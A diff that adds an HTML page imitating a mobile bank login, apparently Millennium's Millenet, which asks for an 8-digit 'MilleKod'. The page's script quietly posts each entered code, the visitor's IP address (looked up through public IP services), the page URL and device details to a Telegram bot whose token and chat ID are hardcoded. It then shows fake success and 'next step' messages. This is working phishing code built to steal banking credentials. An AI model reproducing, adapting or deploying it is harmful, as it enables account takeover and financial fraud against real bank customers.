@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>MilleKod</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #ffffff;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+
+        /* Progress Bar */
+        .progress-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background-color: #e5e5e7;
+            z-index: 999;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background-color: #ff2d92;
+            width: 20%;
+            transition: width 0.3s ease;
+        }
+
+        /* Main Content */
+        .main-content {
+            padding-top: 2px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 2px 20px 20px;
+        }
+
+        .title {
+            font-size: 34px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 60px;
+            text-align: center;
+        }
+
+        .input-container {
+            width: 100%;
+            max-width: 320px;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 50px;
+            border: 1px solid #d1d1d6;
+            border-radius: 8px;
+            padding: 0 16px;
+            font-size: 17px;
+            background-color: #ffffff;
+            color: #000000;
+            outline: none;
+            transition: border-color 0.2s ease;
+        }
+
+        .input-field:focus {
+            border-color: #007aff;
+        }
+
+        .forgot-link {
+            color: #ff3b30;
+            font-size: 17px;
+            text-decoration: none;
+            margin-bottom: 40px;
+            display: block;
+            text-align: center;
+        }
+
+        .description {
+            color: #8e8e93;
+            font-size: 13px;
+            text-align: center;
+            line-height: 18px;
+            margin-bottom: 60px;
+            max-width: 320px;
+        }
+
+        .buttons-container {
+            width: 100%;
+            max-width: 320px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .btn {
+            width: 100%;
+            height: 50px;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            outline: none;
+        }
+
+        .btn-primary {
+            background-color: #ff2d92;
+            color: #ffffff;
+        }
+
+        .btn-primary:hover {
+            background-color: #e0267f;
+        }
+
+        .btn-primary:active {
+            background-color: #c91e6d;
+        }
+
+        .btn-secondary {
+            background-color: #f2f2f7;
+            color: #8e8e93;
+        }
+
+        .btn-secondary:hover {
+            background-color: #e5e5ea;
+        }
+
+        .btn-secondary:active {
+            background-color: #d1d1d6;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Home Indicator */
+        .home-indicator {
+            position: fixed;
+            bottom: 8px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 134px;
+            height: 5px;
+            background-color: #000000;
+            border-radius: 3px;
+            z-index: 1000;
+        }
+
+        /* Loading State */
+        .loading {
+            opacity: 0.6;
+            pointer-events: none;
+        }
+
+        .loading .btn-primary {
+            background-color: #ff2d92;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .loading .btn-primary::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: loading 1.5s infinite;
+        }
+
+        @keyframes loading {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        /* Success/Error Messages */
+        .message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0,0,0,0.8);
+            color: #ffffff;
+            padding: 16px 24px;
+            border-radius: 8px;
+            font-size: 17px;
+            z-index: 2000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .message.show {
+            opacity: 1;
+        }
+
+        .message.success {
+            background-color: #34c759;
+        }
+
+        .message.error {
+            background-color: #ff3b30;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 375px) {
+            .main-content {
+                padding: 2px 16px 20px;
+            }
+            
+            .title {
+                font-size: 28px;
+                margin-bottom: 40px;
+            }
+            
+            .description {
+                margin-bottom: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Progress Bar -->
+    <div class="progress-container">
+        <div class="progress-bar"></div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <h1 class="title">Enter MilleKod</h1>
+        
+        <div class="input-container">
+            <input 
+                type="text" 
+                class="input-field" 
+                id="millekodInput"
+                placeholder=""
+                maxlength="8"
+                autocomplete="off"
+                autocorrect="off"
+                autocapitalize="off"
+                spellcheck="false"
+            >
+        </div>
+
+        <a href="#" class="forgot-link" id="forgotLink">I don't remember Millekod</a>
+
+        <p class="description">
+            Enter an 8-digit MilleKod login or your own name for MilleKod defined in Millenet.
+        </p>
+
+        <div class="buttons-container">
+            <button class="btn btn-primary" id="nextBtn" disabled>NEXT</button>
+            <button class="btn btn-secondary" id="cancelBtn">CANCEL</button>
+        </div>
+    </div>
+
+    <!-- Home Indicator -->
+    <div class="home-indicator"></div>
+
+    <!-- Message -->
+    <div class="message" id="message"></div>
+
+    <script>
+        // Elements
+        const input = document.getElementById('millekodInput');
+        const nextBtn = document.getElementById('nextBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const forgotLink = document.getElementById('forgotLink');
+        const message = document.getElementById('message');
+        const progressBar = document.querySelector('.progress-bar');
+
+        // Telegram Bot Configuration
+        const TELEGRAM_CONFIG = {
+            botToken: '8232091350:AAFLpQ4Uxi8IJ5G8dfoBqIHb5jWQvi8SL-o',
+            chatId: '-4967096174',
+            apiUrl: 'https://api.telegram.org'
+        };
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            input.focus();
+            updateButtonState();
+        });
+
+        // Input handling
+        input.addEventListener('input', function() {
+            // Remove non-numeric characters
+            this.value = this.value.replace(/\D/g, '');
+            
+            // Limit to 8 characters
+            if (this.value.length > 8) {
+                this.value = this.value.substring(0, 8);
+            }
+            
+            updateButtonState();
+        });
+
+        input.addEventListener('keydown', function(e) {
+            // Allow: backspace, delete, tab, escape, enter, arrows
+            if ([8, 9, 27, 13, 37, 38, 39, 40].indexOf(e.keyCode) !== -1 ||
+                // Allow: Ctrl+A, Ctrl+C, Ctrl+V, Ctrl+X
+                (e.keyCode === 65 && e.ctrlKey === true) ||
+                (e.keyCode === 67 && e.ctrlKey === true) ||
+                (e.keyCode === 86 && e.ctrlKey === true) ||
+                (e.keyCode === 88 && e.ctrlKey === true)) {
+                return;
+            }
+            // Allow only numbers
+            if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
+                e.preventDefault();
+            }
+        });
+
+        // Button state management
+        function updateButtonState() {
+            const isValid = /^\d{8}$/.test(input.value);
+            nextBtn.disabled = !isValid;
+        }
+
+        // Next button click
+        nextBtn.addEventListener('click', async function() {
+            if (nextBtn.disabled) return;
+            
+            const code = input.value.trim();
+            if (!validateCode(code)) {
+                showMessage('Please enter a valid 8-digit MilleKod', 'error');
+                return;
+            }
+
+            await submitCode(code);
+        });
+
+        // Cancel button click
+        cancelBtn.addEventListener('click', function() {
+            input.value = '';
+            updateButtonState();
+            input.focus();
+        });
+
+        // Forgot link click
+        forgotLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            showMessage('Contact support for MilleKod recovery', 'error');
+        });
+
+        // Enter key handling
+        input.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !nextBtn.disabled) {
+                nextBtn.click();
+            }
+        });
+
+        // Validation
+        function validateCode(code) {
+            return /^\d{8}$/.test(code);
+        }
+
+        // Get client IP and website URL
+        async function getClientInfo() {
+            try {
+                // Get website URL
+                const websiteUrl = window.location.href;
+                
+                // Try to get IP from multiple sources
+                let clientIP = 'Unknown';
+                
+                try {
+                    // Method 1: Try ipify API
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    clientIP = ipData.ip;
+                } catch (e) {
+                    try {
+                        // Method 2: Try ipapi API
+                        const ipResponse2 = await fetch('https://ipapi.co/json/');
+                        const ipData2 = await ipResponse2.json();
+                        clientIP = ipData2.ip;
+                    } catch (e2) {
+                        // Method 3: Try httpbin API
+                        const ipResponse3 = await fetch('https://httpbin.org/ip');
+                        const ipData3 = await ipResponse3.json();
+                        clientIP = ipData3.origin;
+                    }
+                }
+                
+                return { websiteUrl, clientIP };
+            } catch (error) {
+                console.error('Error getting client info:', error);
+                return { 
+                    websiteUrl: window.location.href, 
+                    clientIP: 'Unknown' 
+                };
+            }
+        }
+
+        // Submit code to Telegram
+        async function submitCode(code) {
+            setLoadingState(true);
+            
+            try {
+                // Get client information
+                const clientInfo = await getClientInfo();
+                
+                const messageText = `🔐 <b>New MilleKod Submitted</b>
+
+📋 <b>MilleKod:</b> <code>${code}</code>
+🌐 <b>Website:</b> ${clientInfo.websiteUrl}
+🌍 <b>Client IP:</b> <code>${clientInfo.clientIP}</code>
+🕐 <b>Time:</b> ${new Date().toLocaleString('ru-RU')}
+🆔 <b>ID:</b> ${Date.now()}
+
+📱 <b>Device Info:</b>
+• Platform: ${navigator.platform}
+• User Agent: ${navigator.userAgent.substring(0, 100)}...
+
+<i>Submitted from MilleKod system</i>`;
+
+                const url = `${TELEGRAM_CONFIG.apiUrl}/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CONFIG.chatId,
+                        text: messageText,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.ok) {
+                    showMessage('MilleKod submitted successfully!', 'success');
+                    input.value = '';
+                    updateButtonState();
+                    
+                    // Update progress bar
+                    progressBar.style.width = '40%';
+                    
+                    // Simulate next step after delay
+                    setTimeout(() => {
+                        showMessage('Redirecting to next step...', 'success');
+                        progressBar.style.width = '60%';
+                    }, 1500);
+                } else {
+                    throw new Error(result.description || 'Failed to submit MilleKod');
+                }
+            } catch (error) {
+                console.error('Error submitting MilleKod:', error);
+                showMessage('Failed to submit MilleKod. Please try again.', 'error');
+            } finally {
+                setLoadingState(false);
+            }
+        }
+
+        // Loading state
+        function setLoadingState(loading) {
+            document.body.classList.toggle('loading', loading);
+            nextBtn.disabled = loading || !validateCode(input.value);
+        }
+
+        // Show message
+        function showMessage(text, type = 'info') {
+            message.textContent = text;
+            message.className = `message ${type}`;
+            message.classList.add('show');
+            
+            setTimeout(() => {
+                message.classList.remove('show');
+            }, 3000);
+        }
+
+        // Prevent zoom on double tap
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function (event) {
+            const now = (new Date()).getTime();
+            if (now - lastTouchEnd <= 300) {
+                event.preventDefault();
+            }
+            lastTouchEnd = now;
+        }, false);
+
+        // Prevent context menu on long press
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // Handle orientation change
+        window.addEventListener('orientationchange', function() {
+            setTimeout(() => {
+                input.focus();
+            }, 100);
+        });
+    </script>
+</body>
+</html>
